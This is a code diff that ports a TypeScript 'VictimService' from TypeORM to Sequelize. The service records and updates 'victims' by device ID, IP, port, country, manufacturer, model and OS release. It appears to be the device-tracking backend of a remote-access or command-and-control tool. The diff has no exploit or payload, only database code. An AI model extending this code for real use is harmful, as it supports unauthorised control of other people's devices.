@@ -1,17 +1,11 @@
-import { Inject, Service } from 'typedi';
-import { DataSource, type Repository } from 'typeorm';
+import { Service } from 'typedi';
 
 import { VictimStatus } from '../../common/enums';
-import { VictimEntity } from '../entities';
+import { type IVictimModel } from '../../common/interfaces';
+import { VictimModel } from '../database';
 
 @Service()
 export class VictimService {
-    private readonly repository: Repository<VictimEntity>;
-
-    public constructor(@Inject() private readonly dataSource: DataSource) {
-        this.repository = this.dataSource.getRepository(VictimEntity);
-    }
-
     public async addOrUpdate(
         deviceId: string,
         ip: string,
@@ -20,28 +14,34 @@ export class VictimService {
         manf: string,
         model: string,
         release: string,
-    ): Promise<VictimEntity> {
-        const victim =
-            (await this.repository.findOne({ where: { deviceId } })) ??
-            this.repository.create();
+    ): Promise<VictimModel> {
+        const values: Omit<IVictimModel, 'id' | 'createdAt' | 'updatedAt'> = {
+            deviceId,
+            ip,
+            port,
+            country,
+            manf,
+            model,
+            release,
+            status: VictimStatus.CONNECTED,
+        };
 
-        victim.deviceId = deviceId;
-        victim.ip = ip;
-        victim.port = port;
-        victim.country = country;
-        victim.manf = manf;
-        victim.model = model;
-        victim.release = release;
-        victim.status = VictimStatus.CONNECTED;
+        let victim = await VictimModel.findOne({ where: { deviceId } });
 
-        return await this.dataSource.getRepository(VictimEntity).save(victim);
+        if (victim === null) {
+            victim = await VictimModel.create(values);
+        } else {
+            await VictimModel.update(values, { where: { deviceId } });
+        }
+
+        return victim;
     }
 
     public async updateStatus(
         deviceId: string,
         status: VictimStatus,
-    ): Promise<VictimEntity> {
-        const victim = await this.repository.findOne({ where: { deviceId } });
+    ): Promise<VictimModel> {
+        const victim = await VictimModel.findOne({ where: { deviceId } });
 
         if (victim === null) {
             throw new Error('Victim not found!');
@@ -49,32 +49,20 @@ export class VictimService {
 
         victim.status = status;
 
-        return await this.repository.save(victim);
+        return await victim.save();
     }
 
     public async delete(id: number): Promise<void> {
-        await this.repository.delete(id);
+        await VictimModel.destroy({ where: { id } });
     }
 
-    public async findByDeviceId(
-        deviceId: string,
-    ): Promise<VictimEntity | null> {
-        return await this.repository.findOne({ where: { deviceId } });
+    public async findByDeviceId(deviceId: string): Promise<VictimModel | null> {
+        return await VictimModel.findOne({ where: { deviceId } });
     }
 
-    public async listConnected(): Promise<VictimEntity[]> {
-        return await this.repository.find({
+    public async listConnected(): Promise<VictimModel[]> {
+        return await VictimModel.findAll({
             where: { status: VictimStatus.CONNECTED },
-        });
-    }
-
-    public async list(
-        pageNumber: number,
-        pageSize: number,
-    ): Promise<VictimEntity[]> {
-        return await this.repository.find({
-            skip: pageNumber * pageSize,
-            take: pageSize,
         });
     }
 }
